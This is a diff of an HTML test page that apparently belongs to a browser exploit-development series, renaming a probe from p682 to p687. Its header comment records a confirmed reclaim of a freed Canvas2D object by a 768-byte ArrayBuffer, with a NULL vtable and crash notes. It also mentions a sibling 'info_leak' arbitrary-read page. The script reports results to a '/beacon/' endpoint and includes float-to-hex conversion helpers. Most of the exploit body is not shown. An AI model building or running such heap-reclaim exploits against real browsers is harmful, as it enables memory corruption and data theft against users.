@@ -1,5 +1,7 @@
 <!--
-  p682: Canvas2D AB(768) reclaim — find safe property access paths
+  p687: Canvas2D AB(768) reclaim — find safe property access paths
+  (renumbered from p682; upstream master ships p682_fontface_canvas_arbread.html
+  in phase23_info_leak, so the short name collided)
   
   CONFIRMED: AB(768) reclaims Canvas2D (IsoHeap OFF). But lineWidth crashes
   because vtable at +0x00 is NULL → any virtual call = SIGSEGV.
@@ -29,15 +31,15 @@
   
   CRASH_CLASS: HIGH per property test
 -->
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>p682</title></head>
-<body>p682: safe access test
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p687</title></head>
+<body>p687: safe access test
 <pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
 <script>
 (function(){
 'use strict';
 var L=document.getElementById('log'),bQ=[];
 function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
-function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P682-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+function flush(){if(!bQ.length)return;try{var b=bQ.splice(0,3).join('|');var x=new XMLHttpRequest();x.open('GET','/beacon/P687-'+encodeURIComponent(b),false);x.send();}catch(e){}}
 window.onerror=function(m){emit('ERR',String(m).slice(0,200));flush();};
 var f64=new Float64Array(1),u8f=new Uint8Array(f64.buffer);
 function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8f[i].toString(16)).slice(-2);return h;}
@@ -178,7 +180,7 @@ function doCanvasTest(){
   }
   flush();
 
-  emit('DONE','p682 test='+testIdx+' complete');flush();
+  emit('DONE','p687 test='+testIdx+' complete');flush();
 }
 
 })();
